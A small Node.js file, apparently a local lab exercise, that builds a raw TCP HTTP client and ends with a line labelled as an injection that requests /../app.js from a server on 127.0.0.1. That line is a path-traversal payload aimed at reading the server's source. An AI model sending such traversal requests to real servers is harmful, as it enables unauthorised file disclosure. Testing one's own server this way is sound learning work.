import net from "net";

class CustomHTTPRequest {

    /**
     * @type {net.Socket}
     */
    #tcpClient = null;

    httpResponse = "";

    #requestUri = "/";

    /**
     * 
     * @param {number} port server port to connect to
     * @param {string} host server host (domain or ip) to connect to
     */
    constructor(port, host, uri) {

        console.assert(typeof port == "number", "port should be number type");
        console.assert(typeof host == "string", "host should be a string");

        if (uri) this.#requestUri = uri;

        // Connection au server
        this.#tcpClient = net.createConnection(port, host, () => {
            console.log("TCP Client created");
        }).on("ready", () => {
            this.#onReady(); // Envoi de la requete HTTP
            this.#tcpClient.on("error", this.#onError);

            this.#tcpClient.on("data", this.#onData); // Reception de la réponse http

            this.#tcpClient.on("close", this.#onClose);
        });
    }

    /**
       * Called on client connected to server
       */
    #onReady() {
        // send http request.
        const httpRequest = `GET ${this.#requestUri} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n`;

        this.#tcpClient.write(httpRequest, (err) => {
            if (err) {
                console.error(err);
                return;
            }
            console.log(httpRequest);
            console.log("Request sent...");
        });
    }

     /**
     * Called when client recv data from server
     * @param {Buffer} data 
     */
     #onData(data) {
        // recv http response
        console.log("Response recieved");
        const httpResponse = data.toString();
        console.log(httpResponse);
        this.httpResponse = httpResponse;

    }

    /**
     * Called on error
     * @param {Error} error 
     */
    #onError(error) {
        console.log(error);
        this.#tcpClient.end();
    }

    /**
     * Called on disconnection
     * @param {boolean} hadError 
     */
    #onClose(hadError) {
        console.log("Client disconnected");
    }
    
}

// requete legitime
// new CustomHTTPRequest(3050,"127.0.0.1","/index.html");

// Injection ! ;)
new CustomHTTPRequest(3050, "127.0.0.1", "/../app.js");



